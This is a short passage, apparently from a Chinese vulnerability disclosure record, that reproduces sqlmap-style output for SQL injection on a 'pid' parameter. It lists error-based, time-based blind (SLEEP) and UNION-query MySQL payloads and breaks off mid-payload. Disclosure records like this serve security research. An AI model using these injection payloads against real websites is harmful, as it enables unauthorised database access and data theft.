wybug_detail: 漏洞详情 披露状态： 4433=4433    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: pid=30 AND (SELECT 5796 FROM(SELECT COUNT(*),CONCAT(0x716a786271,(SELECT (ELT(5796=5796,1))),0x717a716271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: pid=30 AND (SELECT * FROM (SELECT(SLEEP(5)))Ervl)    Type: UNION query    Title: Generic UNION query (NULL) - 13 columns    Payload: pid=30 UNION ALL SELECT
